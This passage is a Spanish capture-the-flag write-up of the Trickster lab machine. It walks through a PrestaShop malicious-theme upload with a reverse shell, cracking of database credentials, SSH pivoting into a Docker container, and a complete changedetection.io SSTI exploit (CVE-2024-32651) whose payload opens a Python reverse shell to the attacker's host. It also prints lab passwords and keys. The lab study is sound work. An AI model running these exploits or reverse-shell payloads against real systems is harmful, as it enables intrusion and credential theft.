                    console.error('Failed to fetch token from HTML');
                    return;
                }

                const csrfToken = await fetchCSRFToken(locationHeaderToken);
                if (!csrfToken) {
                    console.error('Failed to fetch CSRF token');
                    return;
                }

                const formData = new FormData();
                formData.append('import_theme[import_from_web]', `http://${httpServerIp}:${httpServerPort}/${fileNameOfTheme}`);
                formData.append('import_theme[_token]', csrfToken);

                const postUrl = `/${path}/index.php/improve/design/themes/import?_token=${locationHeaderToken}`;
                console.log('POST URL:', postUrl);

                const response = await fetch(postUrl, {
                    method: 'POST',
                    body: formData,
                });

                if (response.ok) {
                    console.log('Theme imported successfully');
                } else {
                    console.error('Failed to import theme. Response Status:', response.status);
                }
            } catch (error) {
                console.error('Error importing theme:', error);
            }
        }

        document.addEventListener('DOMContentLoaded', function () {
            importTheme();
        });
    &lt;/script&gt;
&lt;/body&gt;

&lt;/html&gt;
<br><br>
<br>El html extrae dos tokens necesarios para autenticar las solicitudes en el panel de administración de PrestaShop.
<br>Envía una solicitud POST para importar un tema malicioso desde el servidor HTTP local del atacante.
<br>Si todo funciona correctamente, el tema malicioso se instala en el servidor objetivo, permitiendonos ejecutar código arbitrario.
<br>
<br>
Lee el archivo reverse_shell_template.php, reemplaza los marcadores de posición y guarda el resultado en reverse_shell.php.

<br>la reverse_shell_template.php es la mítica rev-shell de <a data-tooltip-position="top" aria-label="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" rel="noopener nofollow" class="external-link" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank">pentestmonkey</a>


<br>
Copia el archivo ps_next_8_theme_malicious_old.zip, agrega el archivo reverse_shell.php dentro del ZIP y lo guarda como ps_next_8_theme_malicious.zip.

<br><br>
<br>Realiza una solicitud GET a la página /contact-us del sitio objetivo.
<br>Extrae el valor del token CSRF del formulario usando BeautifulSoup.
<br><br>
<br>Prepara una solicitud POST con los siguientes datos:

<br>Un archivo adjunto (exploit.html disfrazado como imagen).
<br>Datos del formulario con el token CSRF, dirección de correo electrónico y mensaje.


<br>Envía la solicitud POST a /contact-us.
<br><br>
<br>Inicia un hilo para enviar solicitudes GET repetidas al archivo PHP malicioso (reverse_shell_new.php) en el servidor objetivo.
<br>Inicia otro hilo para ejecutar el servidor HTTP local.
<br><br>
<br>Si la solicitud POST tiene éxito, inicia un servidor de escucha con ncat en el puerto 12345 para recibir la conexión inversa del shell.
<br>Si se detecta una conexión, detiene todos los hilos.
<br><br>Realiza una limpieza al finalizar:<br>
<br>Elimina el archivo ZIP modificado (ps_next_8_theme_malicious.zip).
<br>Elimina el archivo PHP  (reverse_shell.php).
<br><br><br>Nos creamos una cuenta en el prestashop:<br>
<img alt="Pasted image 20250213112820.png" src="machines/trickster/imgs/pasted-image-20250213112820.png"><br><img alt="Pasted image 20250213120710.png" src="machines/trickster/imgs/pasted-image-20250213120710.png"><br><br>$ cat /etc/passwd | grep -E "/bin/sh|/bin/bash"
root:x:0:0:root:/root:/bin/bash
james:x:1000:1000:trickster:/home/james:/bin/bash
adam:x:1002:1002::/home/adam:/bin/bash
runner:x:1003:1003::/home/runner:/bin/sh
<br>Seguimos en PrivEsc ---&gt; ]]></description><link>machines/trickster/1.recon.html</link><guid isPermaLink="false">Machines/Trickster/1.Recon.md</guid><pubDate>Thu, 13 Feb 2025 11:10:30 GMT</pubDate><enclosure url="machines/trickster/imgs/pasted-image-20250212101724.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="machines/trickster/imgs/pasted-image-20250212101724.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2.PrivEsc]]></title><description><![CDATA[ 
 <br><br>Directorio /var/www<br>www-data@trickster:~$ ls -la
total 20
drwxr-xr-x  5 root     root     4096 Sep 13 12:24 .
drwxr-xr-x 14 root     root     4096 Sep 13 12:24 ..
drwxr-xr-x  2 root     root     4096 Sep 13 12:24 html
drwxr-xr-x 28 www-data www-data 4096 Sep 17 18:07 prestashop
drwxr-xr-x  5 www-data www-data 4096 Feb 13 15:09 trickster
<br><br>www-data@trickster:~$ find / -perm -4000 -print 2&gt;/dev/null
/snap/core20/2379/usr/bin/chfn
/snap/core20/2379/usr/bin/chsh
/snap/core20/2379/usr/bin/gpasswd
/snap/core20/2379/usr/bin/mount
/snap/core20/2379/usr/bin/newgrp
/snap/core20/2379/usr/bin/passwd
/snap/core20/2379/usr/bin/su
/snap/core20/2379/usr/bin/sudo
/snap/core20/2379/usr/bin/umount
/snap/core20/2379/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2379/usr/lib/openssh/ssh-keysign
/snap/core20/2318/usr/bin/chfn
/snap/core20/2318/usr/bin/chsh
/snap/core20/2318/usr/bin/gpasswd
/snap/core20/2318/usr/bin/mount
/snap/core20/2318/usr/bin/newgrp
/snap/core20/2318/usr/bin/passwd
/snap/core20/2318/usr/bin/su
/snap/core20/2318/usr/bin/sudo
/snap/core20/2318/usr/bin/umount
/snap/core20/2318/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2318/usr/lib/openssh/ssh-keysign
/snap/snapd/21759/usr/lib/snapd/snap-confine
/usr/libexec/polkit-agent-helper-1
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/umount
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/opt/google/chrome/chrome-sandbox
<br>GUID<br>www-data@trickster:~$ find / -perm -2000 -print 2&gt;/dev/null
/var/spool/postfix/public
/var/mail
/var/local
/var/log/journal
/var/log/journal/add7a2fa4f114fc2b05f9d28de9f9bb3
/var/log/mysql
/run/log/journal
/snap/core20/2379/usr/bin/chage
/snap/core20/2379/usr/bin/expiry
/snap/core20/2379/usr/bin/ssh-agent
/snap/core20/2379/usr/sbin/pam_extrausers_chkpwd
/snap/core20/2379/usr/sbin/unix_chkpwd
/snap/core20/2379/var/mail
/snap/core20/2318/usr/bin/chage
/snap/core20/2318/usr/bin/expiry
/snap/core20/2318/usr/bin/ssh-agent
/snap/core20/2318/usr/sbin/pam_extrausers_chkpwd
/snap/core20/2318/usr/sbin/unix_chkpwd
/snap/core20/2318/var/mail
/usr/bin/expiry
/usr/bin/dotlockfile
/usr/bin/crontab
/usr/bin/chage
/usr/bin/ssh-agent
/usr/sbin/postqueue
/usr/sbin/unix_chkpwd
/usr/sbin/postdrop
/usr/sbin/pam_extrausers_chkpwd
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/local/share/fonts

<br><br>Revisamos las conexiones de la maquina<br>$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:41935         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -              
<br>Parece que hay un mysql abierto; era de esperar porque es necesario para el funcionamiento de la pagina web.<br>Vamos a hacer un fuzzeo del directorio de Prestashop para buscar algo relacionado con una base de datos ; seguramente mysql que es la que funciona en el puerto 3306:<br>grep -ri "mysql" /var/www/
grep -risE "(mysql|dbname|db_user|db_password|db_host|database)" /var/www/
<br>Encuentro informacion interesante en la siguiente ruta<br>/var/www/prestashop/var/cache/prod/FrontContainer.php
<br>        return [
            'database_host' =&gt; '127.0.0.1',
            'database_port' =&gt; '',
            'database_name' =&gt; 'prestashop',
            'database_user' =&gt; 'ps_user',
            'database_password' =&gt; 'prest@shop_o',
            'database_prefix' =&gt; 'ps_',
            'database_engine' =&gt; 'InnoDB',
            'mailer_transport' =&gt; 'smtp',
            'mailer_host' =&gt; '127.0.0.1',
            'mailer_user' =&gt; NULL,
            'mailer_password' =&gt; NULL,
            'secret' =&gt; 'eHPDO7bBZPjXWbv3oSLIpkn5XxPvcvzt7ibaHTgWhTBM3e7S9kbeB1TPemtIgzog',
            'ps_caching' =&gt; 'CacheMemcache',
            'ps_cache_enable' =&gt; false,
            'ps_creation_date' =&gt; '2024-05-25',
            'locale' =&gt; 'en-US',
            'use_debug_toolbar' =&gt; true,
            'cookie_key' =&gt; '8PR6s1SJZLPCjXTegH7fXttSAXbG2h6wfCD3cLk5GpvkGAZ4K9hMXpxBxrf7s42i',
            'cookie_iv' =&gt; 'fQoIWUoOLU0hiM2VmI1KPY61DtUsUx8g',
<br><br>Bueno como dirian mis colegas del sector "we're in"<br>
<img alt="Pasted image 20250213163524.png" src="machines/trickster/imgs/pasted-image-20250213163524.png"><br>MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| prestashop         |
+--------------------+
<br>De la base de datos saco las siguientes credenciales;<br>admin@trickster.htb : $2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C
james@trickster.htb : $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm
<br>Identificamos los hashes:<br>➜  Trickster hashcat credentials 
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-AMD Custom APU 0405, 6360/12785 MB (2048 MB allocatable), 8MCU

The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce


<br>Creds :<br>
Crackeamos las passwords con hashcat o john <br>john credentials --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 3200  credentials /usr/share/wordlists/rockyou.txt 
<br>james : alwaysandforever
<br><br>Nos logeamos por ssh<br>➜  Trickster ssh james@trickster.htb
The authenticity of host 'trickster.htb (10.10.11.34)' can't be established.
ED25519 key fingerprint is SHA256:SZyh4Oq8EYrDd5T2R0ThbtNWVAlQWg+Gp7XwsR6zq7o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'trickster.htb' (ED25519) to the list of known hosts.
james@trickster.htb's password: 
Last login: Thu Sep 26 11:13:01 2024 from 10.10.14.41
james@trickster:~$ id
uid=1000(james) gid=1000(james) groups=1000(james)
james@trickster:~$ whoami
james
james@trickster:~$ 
<br>Sudo -l :<br>james@trickster:~$ sudo -l
[sudo] password for james: 
Sorry, user james may not run sudo on trickster.
<br>Revisando la configuracion de la red vemos que tenemos acceso a una red de docker pero no podemos ejecutar comandos de docker ya que james no forma parte del grupo docker:<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:e4:77 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.10.11.34/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
3: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:18:3b:cb:65 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
37: vethf843401@if36: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 0e:e5:f9:ea:9f:36 brd ff:ff:ff:ff:ff:ff link-netnsid 0
<br>viendo que tenemos una interfaz de ip's de docker vamos a escanear la red en búsqueda de posibles puntos de ataque;<br>Ya que nmap no esta  instalado en la maquina vamos a escanear la maquina con tecnicas lotl (living off the land)<br><a data-tooltip-position="top" aria-label="https://sevenlayers.com/index.php/blog/490-living-off-the-land-scanning" rel="noopener nofollow" class="external-link" href="https://sevenlayers.com/index.php/blog/490-living-off-the-land-scanning" target="_blank">Living  off the land tecniches : nmap</a><br><br>james@trickster:~$ for i in {1..254}; do ping -w 2 -c 1 172.17.0.$i | grep "64 bytes" | cut -d ' ' -f 4 | sed 's/://'; done;

172.17.0.1
172.17.0.2
<br>Vemos que tiene conexion con 2 ips dentro del rango;<br>
la 172.17.0.1 es la del propio host; mientras que la 172.17.0.2 parece de un container; vamos a investigar puertos abiertos<br><br>Escaneamos con nc el rango entero de puertos de la ip 172.17.0.2<br>james@trickster:~$ nc -vnz -w 1 172.17.0.2 1-65535 2&gt;&amp;1 | grep succeeded
Connection to 172.17.0.2 5000 port [tcp/*] succeeded!
<br>Tenemos conexion con el puerto 5000 vamos a hacer pivoting con ssh<br><br>Tenemos algun servicio corriendo en un docker en la ip 172.17.0.2 por el puerto 5000 vamos a hacer un puente con ssh para tener conexion con el puerto aunque podriamos hacer pivoting con chisel ,metaexploit o lingolo-ng;<br>➜  ~ ssh james@trickster.htb -L 5000:172.17.0.2:5000
<br>Podemos escanear el puerto con nmap a ver si encontramos informacion del servicio; ahora que esta establecido el puente la conexion<br>sudo nmap -sCV -p 5000 -v -Pn -n localhost
PORT     STATE SERVICE VERSION                                       
5000/tcp open  http    Python http.server 3.5 - 3.10
| http-title: Change Detection
|_Requested resource was /login?next=/
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
<br>Nos encontramos ante un changedetection.io en la v0.45.20<br>
<img alt="Pasted image 20250214113934.png" src="machines/trickster/imgs/pasted-image-20250214113934.png"><br><br>Investigando sobre la version de changedetection.io ; vemos que la version es vulnerable a la un SSTI en la version actual <br>Un SSTI (Server-Side Template Injection) es una vulnerabilidad de seguridad que permite a un atacante inyectar y ejecutar código en la plantilla de una aplicación del lado del servidor, aprovechando malas prácticas en el procesamiento de datos dinámicos. Esto puede llevar a la ejecución remota de código, acceso no autorizado o robo de datos sensibles. Ocurre cuando la aplicación inserta entradas de usuario sin sanitizar en templates que son procesados por el servidor.<br>Para mas informacion sobre ataques SSTI podemos visitar la pagina de <a data-tooltip-position="top" aria-label="https://portswigger.net/web-security/server-side-template-injection" rel="noopener nofollow" class="external-link" href="https://portswigger.net/web-security/server-side-template-injection" target="_blank">Portswigger</a><br>Esta vulnerabilidad de changedetection.io esta documentada en el <a data-tooltip-position="top" aria-label="https://nvd.nist.gov/vuln/detail/CVE-2024-32651" rel="noopener nofollow" class="external-link" href="https://nvd.nist.gov/vuln/detail/CVE-2024-32651" target="_blank">CVE-2024-32651</a><br><br>Buscamos en github y hay un PoC que automatiza el proceso del SSTI ; pongo el codigo y lo analizamos;<br>Al siguiente script debemos pasarle las siguientes variables<br>
<br>--url: URL base del sitio vulnerable (Nuestro caso: http://localhost:5000).
<br>--port: Puerto en el que el atacante escuchará la conexión inversa 
<br>--ip: Dirección IP del atacante para recibir la conexión inversa. (Nuestra interfaz tun0)
<br>--notification: URL de notificación personalizada (opcional).
<br># Exploit Title: changedetection &lt;= 0.45.20 Remote Code Execution (RCE)
# Date: 5-26-2024
# Exploit Author: Zach Crosman (zcrosman)
# Vendor Homepage: changedetection.io
# Software Link: https://github.com/dgtlmoon/changedetection.io
# Version: &lt;= 0.45.20
# Tested on: Linux
# CVE : CVE-2024-32651

from pwn import *
import requests
from bs4 import BeautifulSoup
import argparse

def start_listener(port):
    listener = listen(port)
    print(f"Listening on port {port}...")
    conn = listener.wait_for_connection()
    print("Connection received!")
    context.newline = b'\r\n'
    # Switch to interactive mode
    conn.interactive()

def add_detection(url, listen_ip, listen_port, notification_url=''):
    session = requests.Session()
    
    # First request to get CSRF token
    request1_headers = {
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close"
    }

    response = session.get(url, headers=request1_headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf_token'})['value']
    print(f'Obtained CSRF token: {csrf_token}')

    # Second request to submit the form and get the redirect URL
    add_url = f"{url}/form/add/quickwatch"
    add_url_headers = {  # Define add_url_headers here
        "Origin": url,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    add_url_data = {
        "csrf_token": csrf_token,
        "url": "https://reddit.com/r/baseball",
        "tags": '',
        "edit_and_watch_submit_button": "Edit &gt; Watch",
        "processor": "text_json_diff"
    }

    post_response = session.post(add_url, headers=add_url_headers, data=add_url_data, allow_redirects=False)

    # Extract the URL from the Location header
    if 'Location' in post_response.headers:
        redirect_url = post_response.headers['Location']
        print(f'Redirect URL: {redirect_url}')
    else:
        print('No redirect URL found')
        return

    # Third request to add the changedetection url with ssti in notification config
    save_detection_url = f"{url}{redirect_url}"
    save_detection_headers = {  # Define save_detection_headers here
        "Referer": redirect_url,
        "Cookie": f"session={session.cookies.get('session')}"
    }

    save_detection_data = {
        "csrf_token": csrf_token,
        "url": "https://reddit.com/r/all",
        "title": '',
        "tags": '',
        "time_between_check-weeks": '',
        "time_between_check-days": '',
        "time_between_check-hours": '',
        "time_between_check-minutes": '',
        "time_between_check-seconds": '30',
        "filter_failure_notification_send": 'y',
        "fetch_backend": 'system',
        "webdriver_delay": '',
        "webdriver_js_execute_code": '',
        "method": 'GET',
        "headers": '',
        "body": '',
        "notification_urls": notification_url,
        "notification_title": '',
        "notification_body": f"""
        {{% for x in ().__class__.__base__.__subclasses__() %}}
        {{% if "warning" in x.__name__ %}}
        {{{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\\"{listen_ip}\\",{listen_port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\"/bin/bash\\")'").read()}}}}
        {{% endif %}}
        {{% endfor %}}
        """,
        "notification_format": 'System default',
        "include_filters": '',
        "subtractive_selectors": '',
        "filter_text_added": 'y',
        "filter_text_replaced": 'y',
        "filter_text_removed": 'y',
        "trigger_text": '',
        "ignore_text": '',
        "text_should_not_be_present": '',
        "extract_text": '',
        "save_button": 'Save'
    }
    final_response = session.post(save_detection_url, headers=save_detection_headers, data=save_detection_data)

    print('Final request made.')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Add detection and start listener')
    parser.add_argument('--url', type=str, required=True, help='Base URL of the target site')
    parser.add_argument('--port', type=int, help='Port for the listener', default=4444)
    parser.add_argument('--ip', type=str, required=True, help='IP address for the listener')
    parser.add_argument('--notification', type=str, help='Notification url if you don\'t want to use the system default')
    args = parser.parse_args()


    add_detection(args.url, args.ip, args.port, args.notification)
    start_listener(args.port)
<br>
<br>Configuración del Listener:

<br>Inicia un listener en un puerto especificado para recibir una conexión inversa desde el servidor vulnerable.


<br>Obtención del Token CSRF:

<br>Realiza una solicitud GET al sitio objetivo para obtener un token CSRF necesario para realizar solicitudes autenticadas.


<br>Creación de una Nueva Detección:

<br>Envía una solicitud POST para agregar una nueva URL a monitorear en la aplicación.
<br>Utiliza este proceso para obtener una URL de redirección que permite editar la configuración de la detección.


<br>Inyección de Código Malicioso:

<br>En la configuración de notificaciones de la nueva detección, inserta un payload SSTI que:

<br>Itera sobre las clases base del sistema Python.
<br>Busca una clase con "warning" en su nombre.
<br>Utiliza esta clase para importar y ejecutar comandos del sistema operativo.
<br>Ejecuta un comando que establece una conexión inversa al IP y puerto del atacante usando python3 y bash.




<br>Envío del Payload:

<br>Guarda la configuración maliciosa enviando otra solicitud POST.
<br>Esto activa el payload SSTI en el servidor vulnerable.


<br>Recepción de la Conexión Inversa:

<br>El servidor vulnerable ejecuta el código inyectado, conectándose al listener del atacante.
<br>El atacante obtiene acceso interactivo a la shell del servidor.


<br>El script no funciona, pruebo a reproducirlo paso a paso anadiendo debugs<br>Y es que el endpoint /login?next=/ Nos devuelve un 500 INTERNAL SERVER ERROR<br>
<img alt="Pasted image 20250214124302.png" src="machines/trickster/imgs/pasted-image-20250214124302.png"><br>Pruebo a logearme con las credenciales de james alwaysandforever<br>
Y entramos;<br>
<img alt="Pasted image 20250214125118.png" src="machines/trickster/imgs/pasted-image-20250214125118.png"><br>Si pulsamos en backup nos decarga un comprimido; vamos a echarle un vistazo;<br>➜  backdump ls
b86f1003-3ecb-4125-b090-27e15ca605b9  changedetection-backup-20250214115130.zip  url-list-with-tags.txt  url-watches.json
bbdd78f6-db98-45eb-9e7b-681a0c60ea34  secret.txt                                 url-list.txt
➜  backdump tree b86f1003-3ecb-4125-b090-27e15ca605b9 
b86f1003-3ecb-4125-b090-27e15ca605b9
|-- 3855b43e05c02a09c0b63be14f70a8bb.txt.br
|-- 7fa5d9292139604c79d87fb69f21ffe2.txt.br
|-- ce6278706b3912f01bf5355004eb538a.txt.br
|-- cf0c62552e4672c2326c0ef0489883c8.txt.br
|-- d589415eb5dbd392fa8874829ce30450.txt.br
|-- dd25d6c8b666e21ac6e596faa4d4a93d.txt.br
`-- history.txt

1 directory, 7 files
➜  backdump cat b86f1003-3ecb-4125-b090-27e15ca605b9/history.txt 
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: b86f1003-3ecb-4125-b090-27e15ca605b9/history.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 1725049268,dd25d6c8b666e21ac6e596faa4d4a93d.txt.br
   2   │ 1725093859,7fa5d9292139604c79d87fb69f21ffe2.txt.br
   3   │ 1725955071,d589415eb5dbd392fa8874829ce30450.txt.br
   4   │ 1726233055,cf0c62552e4672c2326c0ef0489883c8.txt.br
   5   │ 1726596196,ce6278706b3912f01bf5355004eb538a.txt.br
   6   │ 1726746285,3855b43e05c02a09c0b63be14f70a8bb.txt.br
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
➜  backdump cat url-list.txt 
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: url-list.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ https://news.ycombinator.com/
   2   │ https://changedetection.io/CHANGELOG.txt
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
➜  backdump cat secret.txt 
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: secret.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 5fce75c64d33acf05d2d3b21d29e693d992f240d5c440310cff3edfb743c64a5

<br><br>En el exploit de Python anterior, vimos la existencia de una flag llamada “–notification”, identificamos en el pie del campo “Notification Body” que usa Jinja2, esto nos permite ejecutar ataques de tipo SSTI (Server-Side Template Injection), reutilizamos el payload del exploit, nos ponemos en escucha por el puerto 80 y pulsamos en “Send test notification”:<br>Recibimos conexion con el servidor mandando una peticion por notification<br>
<img alt="Pasted image 20250214130533.png" src="machines/trickster/imgs/pasted-image-20250214130533.png"><br>
Ahora tenemos que inyectar la rev shell del script en el campo notifications; y somos root en el container<br><img alt="Pasted image 20250214130827.png" src="machines/trickster/imgs/pasted-image-20250214130827.png"><br>Encuentro el directorio /datastore/Backups dentro del container; no tenemos ni nc ni wget pero si python entonces puedo lanzat un servidor http y hacer otro puente ssh hacia el puerto<br>root@a4b9a36ae7ff:/datastore/Backups# python -m http.server 2000
Serving HTTP on 0.0.0.0 port 2000 (http://0.0.0.0:20
<br><img alt="Pasted image 20250214131310.png" src="machines/trickster/imgs/pasted-image-20250214131310.png"><br>Dentro de los backups encontramos estos archivos .br;<br><img alt="Pasted image 20250214174849.png" src="machines/trickster/imgs/pasted-image-20250214174849.png"><br>Lo descomprimimos con la herramienta <a data-tooltip-position="top" aria-label="https://github.com/google/brotli" rel="noopener nofollow" class="external-link" href="https://github.com/google/brotli" target="_blank">brotli</a> ; <br>➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 l
total 16K
drwxrwxr-x 2 kali kali 4,0K ago 31 10:50 .
drwxrwxr-x 3 kali kali 4,0K feb 14 13:14 ..
-rw-r--r-- 1 kali kali 2,6K ago 31 01:47 f04f0732f120c0cc84a993ad99decb2c.txt.br
-rw-r--r-- 1 kali kali   51 ago 31 01:47 history.txt
➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 brotli -d f04f0732f120c0cc84a993ad99decb2c.txt.br
➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 ls
f04f0732f120c0cc84a993ad99decb2c.txt  f04f0732f120c0cc84a993ad99decb2c.txt.br  history.txt

<br>en el archivo de texto encontramos la password del usuario Adam<br>
<img alt="Pasted image 20250214175709.png" src="machines/trickster/imgs/pasted-image-20250214175709.png"><br><br>➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 cat --plain f04f0732f120c0cc84a993ad99decb2c.txt | grep password
                'database_password' =&gt; 'adam_admin992' ,                                                                                                               
                'mailer_password' =&gt; NULL ,                                                                                                                            
➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 ssh adam@trickster.htb
adam@trickster.htb's password: 
adam@trickster:~$ id
uid=1002(adam) gid=1002(adam) groups=1002(adam)
adam@trickster:~$ whoami
adam
adam@trickster:~$ 
<br>Adam puede usar sudo en :<br>adam@trickster:~$ sudo -l
Matching Defaults entries for adam on trickster:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User adam may run the following commands on trickster:
    (ALL) NOPASSWD: /opt/PrusaSlicer/prusaslicer
<br>El binario no aparece en GTFObins; una busqueda en google me indica que igual es un binario relacionado con la gestion de impresoras 3D;<br>
<img alt="Pasted image 20250214181500.png" src="machines/trickster/imgs/pasted-image-20250214181500.png"><br>Le realizamos un string <br>adam@trickster:~$ strings /opt/PrusaSlicer/prusaslicer | grep print
sprintf
fprintf
appimage_print_binary
appimage_print_hex
print_help
  --appimage-mount                Mount embedded filesystem image and print

<br>adam@trickster:~$ /opt/PrusaSlicer/prusaslicer
DISPLAY not set, GUI mode not available.

PrusaSlicer-2.6.1+linux-x64-GTK2-202309060801 based on Slic3r (with GUI support)
https://github.com/prusa3d/PrusaSlicer

Usage: prusa-slicer [ ACTIONS ] [ TRANSFORM ] [ OPTIONS ] [ file.stl ... ]

Actions:
 --export-3mf        Export the model(s) as 3MF.
 --export-amf        Export the model(s) as AMF.
 --export-gcode, --gcode, -g
                     Slice the model and export toolpaths as G-code.
 --export-obj        Export the model(s) as OBJ.
 --export-sla, --sla Slice the model and export SLA printing layers as PNG.
 --export-stl        Export the model(s) as STL.
 --gcodeviewer       Visualize an already sliced and saved G-code
 --help, -h          Show this help.
 --help-fff          Show the full list of print/G-code configuration options.
 --help-sla          Show the full list of SLA print configuration options.
 --info              Write information about the model to the console.
 --opengl-debug      Activate OpenGL debug output on graphic cards which support it
 --opengl-version ABCD
                     Select a specific version of OpenGL
 --save ABCD         Save configuration to the specified file.
 --slice, -s         Slice the model as FFF or SLA based on the printer_technology configuration
                     value.

Transform options:
 --align-xy X,Y      Align the model to the given point.
 --center X,Y        Center the print around the given center.
 --cut N             Cut model at the given Z.
 --delete-after-load ABCD
                     Delete files after loading.
 --dont-arrange      Do not rearrange the given models before merging and keep their original XY
                     coordinates.
 --duplicate N       Multiply copies by this factor.
 --duplicate-grid X,Y
                     Multiply copies by creating a grid.
 --ensure-on-bed     Lift the object above the bed when it is partially below. Enabled by default,
                     use --no-ensure-on-bed to disable.
 --merge, -m         Arrange the supplied models in a plate and merge them in a single model in order
                     to perform actions once.
 --repair            Try to repair any non-manifold meshes (this option is implicitly added whenever
                     we need to slice the model to perform the requested action).
 --rotate N          Rotation angle around the Z axis in degrees.
 --rotate-x N        Rotation angle around the X axis in degrees.
 --rotate-y N        Rotation angle around the Y axis in degrees.
 --scale N           Scaling factor or percentage.
 --scale-to-fit X,Y,Z
                     Scale to fit the given volume.
 --split             Detect unconnected parts in the given model(s) and split them into separate
                     objects.

Other options:
 --config-compatibility
                     This version of PrusaSlicer may not understand configurations produced by the
                     newest PrusaSlicer versions. For example, newer PrusaSlicer may extend the list
                     of supported firmware flavors. One may decide to bail out or to substitute an
                     unknown value with a default silently or verbosely. (disable, enable,
                     enable_silent; default: enable)
 --datadir ABCD      Load and store settings at the given directory. This is useful for maintaining
                     different profiles or including configurations from a network storage.
 --ignore-nonexistent-config
                     Do not fail if a file supplied to --load does not exist.
 --load ABCD         Load configuration from the specified file. It can be used more than once to
                     load options from multiple files.
